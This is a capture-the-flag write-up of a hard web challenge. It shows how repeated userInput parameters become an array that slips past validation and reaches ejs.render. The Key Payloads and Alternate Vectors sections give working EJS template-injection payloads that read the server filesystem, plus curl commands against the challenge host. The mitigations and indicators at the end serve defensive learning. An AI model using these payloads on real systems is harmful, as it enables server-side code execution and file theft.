![header](https://capsule-render.vercel.app/api?type=waving&height=120&text=PlaycatEJS%20Type%20Confusion%20RCE&fontColor=00E1FF&color=0A0F1F,1A2A3A&fontSize=32&fontAlignY=40)

<div align="center">
<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://img.shields.io/badge/Web-EJS%20Type%20Confusion-critical?logo=node.js&logoColor=white&labelColor=0d1117&color=8b0000">
  <img alt="EJS Type Confusion" src="https://img.shields.io/badge/Web-EJS%20Type%20Confusion-critical?logo=node.js&logoColor=white&labelColor=fafafa&color=8b0000">
</picture>
<sub>Array coercion bypasses validation; template injection reads filesystem.</sub>

<table>
  <tr><td><strong>CTF</strong></td><td>IBOH_APU</td><td><strong>Category</strong></td><td>Web Exploitation</td></tr>
  <tr><td><strong>Difficulty</strong></td><td>Hard</td><td><strong>Exploit Time</strong></td><td>&lt; 5 min</td></tr>
  <tr><td><strong>Key Sink</strong></td><td>`ejs.render(JSON.stringify(input))`</td><td><strong>Flag</strong></td><td><code>BOH25{wHy_15_th3r3_s0_m4ny_vuln3r4b1l17y_1n_J5???}</code></td></tr>
</table>

<details>
  <summary><strong>▼ Flow Diagram</strong></summary>
  <div class="mermaid">
flowchart LR
  R[Repeated userInput params] --> A[Array creation]
  A --> V[Validation Bypass]
  V --> T[EJS render JSON]
  T --> FS[Filesystem Access]
  FS --> F[Flag]
  style F fill:#0b6623,stroke:#0b6623,color:#fff

  </div>
  </details>
</div>

# Playcat EJS Injection (Concise)

![vector](https://img.shields.io/badge/Vector-type%20confusion-red) ![primitive](https://img.shields.io/badge/Primitive-EJS%20template-yellow) ![impact](https://img.shields.io/badge/Impact-remote%20file%20read-critical) ![technique](https://img.shields.io/badge/Technique-array%20validation%20bypass-blue) ![status](https://img.shields.io/badge/Flag-exfiltrated-success)

## Summary
Duplicate `userInput` parameters create an array, bypass blacklist & length checks, feeding attacker-controlled EJS into `ejs.render(JSON.stringify(input))` → arbitrary template execution → filesystem read of renamed flag.

## Chain
Craft array request → skip blacklist (no `value`) → EJS interprets `<%=` payload inside array → enumerate files → read flag.

## Recon
| Item | Observation |
|------|-------------|
| Stack | Node.js / Express / EJS |
| Endpoint | POST `/` name submission |
| Flag rename | `flag.txt -> flag-<ID>.txt` at startup |
| Sink | `ejs.render(JSON.stringify(input))` for non-strings |

## Vulnerability Points
| Vector | Weakness | Effect |
|--------|----------|--------|
| Type check | `typeof input === 'string'` only | Arrays fall to render path |
| Length check | `input.length > 10` | Array length small, not char count |
| Blacklist | Applies to `value` property | Arrays lack `value` → bypass |
| Render path | `ejs.render(JSON.stringify(input))` | Template code executed |

## Exploit Steps
| Step | Action | Payload / Command | Result |
|------|--------|------------------|--------|
| 1 | Create array input | `userInput[]=test&userInput[]=<%=1%>` | Template executes |
| 2 | Confirm execution | See `1` rendered | Code run |
| 3 | List directory | `<%=process.mainModule.require(`fs`).readdirSync(`.`)%>` | Flag filename leaked |
| 4 | Read flag | `<%=process.mainModule.require(`fs`).readFileSync(`flag-3d0749be.txt`)%>` | Raw flag bytes |

## Key Payloads
```bash
curl -X POST http://47.130.175.253:3001/ \
  -d 'userInput[]=<%=process.mainModule.require(`fs`).readdirSync(`.`)%>' \
  -d 'userInput[]=x'

curl -X POST http://47.130.175.253:3001/ \
  -d 'userInput[]=<%=process.mainModule.require(`fs`).readFileSync(`flag-3d0749be.txt`)%>' \
  -d 'userInput[]=x'
```

## Alternate Vectors
| Payload | Purpose |
|---------|---------|
| `<%=global.process.mainModule.require(`fs`).readdirSync(`.`)%>` | Use global object |
| `<%=constructor.constructor('return process')().mainModule.require('fs').readdirSync('.')%>` | Constructor chain |

## Pitfalls
| Issue | Fix |
|-------|-----|
| Blacklisted chars | Use backticks not quotes |
| Length rejection | Keep array element count ≤10 |
| Missing array form | Send repeated parameter names |

## Mitigation
| Control | Purpose |
|---------|---------|
| Enforce string type early | Reject arrays/objects |
| Render safe path | Remove dynamic `ejs.render` on user data |
| Whitelist characters | Instead of fragile blacklist |
| CSP + sandbox | Limit template side effects |
| Dependency audit | Ensure EJS patched & configured safe |

## Indicators
Repeated param names; array JSON shown in output; presence of EJS delimiters executing; filesystem listing returned.

## Final Flag
`BOH25{wHy_15_th3r3_s0_m4ny_vuln3r4b1l17y_1n_J5???}`


